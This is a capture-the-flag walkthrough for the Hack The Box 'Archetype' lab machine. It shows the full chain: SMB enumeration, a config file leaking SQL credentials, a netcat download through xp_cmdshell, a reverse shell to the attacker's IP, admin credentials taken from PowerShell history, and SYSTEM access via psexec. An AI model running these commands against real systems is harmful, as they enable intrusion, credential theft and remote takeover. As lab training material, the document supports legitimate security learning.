# Hack The Box Archetype Walkthrough

## Archetype

Assign the IP address of the Archetype machine to an environment variable:  
```export IP=10.10.10.27```  

Scan the Archetype machine:  
**-sC** for a script scan using the default scripts  
**-sV** for version detection  
**-Pn** disable host discovery (we already know the host is up)  
```nmap -sC -sV -Pn $IP```

**Open Ports**
```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM

target name: ARCHETYPE
smb running on ports 135/139/445
SQL server running on 1433
computer name: ARCHETYPE
smb security mode:
	- account_used: guest
	- authentication_level: user
```
It looks like SMB is running on ports **135/139/445** as well as a SQL server instance running on port **1433**. Also, it looks like the nmap scan discovered that the smb security mode is using guest access.  
Let's list the available SMB shares on the target:  
```smbclient -N -L ////$IP//```  

**SMB shares**
```
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    backups         Disk      
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
```

The backups share looks interesting, let's attempt to access the backups SMB share:  
```smbclient //$IP/backups```
```
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                10328063 blocks of size 4096. 8256400 blocks available

```
Let's download the **prod.dtsConfig** and have a look at it:  
```smb: \> get prod.dtsConfig```
```
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
```
Back on our Kali machine, let's print the contents of the file we just got:  
```cat prod.dtsConfig```

```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

Let's attempt to connect to the SQL server using the credentials found in the prod.dtsConfig file:  
```impacket-mssqlclient sql_svc:M3g4c0rp123@$IP -windows-auth```
```
SQL >
```

This is great for an initial foothold, but we need to do some privilege escalation because this user doesn't have administrative privileges. Because we're able to execute commands on the target machine using xp_cmdshell via the SQL connection, let's try to get netcat onto the target machine so we can initiate a reverse shell.  

Copy the nc.exe from the windows-resources folder on Kali to my home folder:  
```cp /usr/share/windows-resources/binaries/nc.exe .```

Start a python3 web server in the current folder to host the nc.exe file:  
```python3 -m http.server 80```
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

On the target machine, download the nc.exe file using xp_cmdshell, wget, and the previous mssqlclient connection. We're going to put it into the **%TEMP%** folder:  
```xp_cmdshell powershell wget http://10.10.17.159/nc.exe -OutFile %TEMP%\nc.exe -UseBasicParsing```
```
10.10.10.27 - - [27/Jun/2021 21:57:14] "GET /nc.exe HTTP/1.1" 200 -
```

Start a nc listener on my Kali machine on port **4444** to listen for a reverse shell connection:  
```sudo nc -lvnp 4444```

Change directory to **C:\Users\sql_svc\Desktop** and print the **user.txt** for the user flag:  
```cd C:\users\sql_svc\Desktop```
```more user.txt```
```
3e7b102e78218e935bf3f4951fec21a3cd
```

From the target machine, use xp_cmdshell once again to execute the nc.exe file we just put onto the target machine to connect to my Kali machine on port **4444**:  
```xp_cmdshell powershell "%TEMP%\nc.exe -nv 10.10.17.159 4444 -e cmd.exe"```
```
C:\Windows\system32>whoami
whoami
archetype\sql_svc
```

By poking around for the powershell history file, we find it in the default directory:  
```dir/s *history.txt```
```
c:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

The following details are contained within the history file:  
```more ConsoleHost_history.txt```
```
net.exe use T: \\Archetype\backups **/user:administrator MEGACORP_4dm1n!!**
```

It looks like someone is using an Administrator account to map the SMB share, and we just got some potential admin credentials! Let's try them out back on our Kali machine with impacket's psexec:  
```impacket-psexec administrator@$IP```

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file fzsGgOsb.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service dMzL on 10.10.10.27.....
[*] Starting service dMzL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
```

Let's check what account we're current using:
```C:\Windows\system32>whoami```

```
nt authority\system
```

Boom! Well done! Now we just need to find the root/system flag, it's generally in the Desktop folder for the respective user/system account:  
```c:\Users\Administrator\Desktop>more root.txt```

```
b91ccec3305e98240082d4474b848528
```
